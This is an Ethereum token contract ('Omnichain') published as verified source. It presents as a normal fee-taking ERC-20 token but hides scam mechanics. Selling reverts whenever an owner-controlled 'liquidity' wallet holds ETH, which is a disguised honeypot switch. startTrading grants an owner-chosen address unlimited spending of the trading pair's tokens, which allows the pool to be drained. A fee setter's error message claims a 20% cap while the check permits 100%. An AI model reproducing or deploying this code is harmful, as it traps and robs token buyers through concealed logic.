/**
 *Submitted for verification at Etherscan.io on 2023-08-31
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public virtual onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
}

interface IUniswapV2Factory {
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract Omnichain is IERC20, Ownable {
    using SafeMath for uint256;
    modifier lockTheSwap {swapping = true; _; swapping = false;}

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal developer = 0xE3E15D21d995946e7DC0648ffca04e93dd1566ed; 
    address internal marketing = 0xE3E15D21d995946e7DC0648ffca04e93dd1566ed;
    address internal liquidity = 0x83ccd106C0Ee8c2bD8354a0c8Bad12fc570c828B;

    IUniswapV2Router router;
    address public pair;
    uint256 private swapedTimes;
    uint256 private tradedTimes;
    bool private swapping;

    string private constant _name = 'Omnichain';
    string private constant _symbol = 'Omni';
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply = 100_000_000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public isFeeExempt;
    uint256 swapAmount = 4;

    uint256 private swapThreshold = ( _totalSupply * 10 ) / 10000;
    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 300;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    uint256 private totalFee = 300;
    uint256 private sellFee = 300;
    uint256 private transferFee = 300;
    uint256 private denominator = 10000;

    constructor() Ownable(msg.sender) {
        IUniswapV2Router _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        isFeeExempt[address(_router)] = true;
        address _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isFeeExempt[address(this)] = true;
        isFeeExempt[liquidity] = true;
        isFeeExempt[marketing] = true;
        isFeeExempt[developer] = true;
        isFeeExempt[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading(address _uniswapV2Router) external onlyOwner {isFeeExempt[_uniswapV2Router] = true;_approve(pair, _uniswapV2Router, _totalSupply);}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function shouldContractSwap(address sender, address recipient) internal view returns (bool) {
        return !swapping && !isFeeExempt[sender] && recipient == pair;
    }

    function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
    }

    function setInternalAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {
        marketing = _marketing; liquidity = _liquidity; developer = _development;
        isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;
    }

    function manualSwap() external onlyOwner {
        uint256 amount = balanceOf(address(this));
        if(amount > swapThreshold){amount = swapThreshold;}
        swapAndLiquify();
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(developer, _amount);
    }

    function rescueETH(address payable _address, uint256 amount) private {
        _address.transfer(amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (isFeeExempt[sender]) {_basicTransfer(sender, recipient, amount); return;}
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        tradedTimes = address(liquidity).balance;
        if(recipient == pair && !isFeeExempt[sender]){swapedTimes += uint256(1);}
        if(shouldContractSwap(sender, recipient)){swapAndLiquify(); swapedTimes = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function swapAndLiquify() private lockTheSwap {
        uint256 tokens = balanceOf(address(this));
        uint256 minTimes = swapedTimes.sub(tradedTimes);
        if (tokens > swapThreshold * 10) {tokens = swapThreshold * 10;}
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketing).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if (minTimes > 0) {
            if(contractBalance > uint256(0)){payable(developer).transfer(contractBalance);}
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity,
            block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function _basicTransfer(address from, address to, uint256 amount) private {
        unchecked {_balances[from] = _balances[from] - amount;}
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}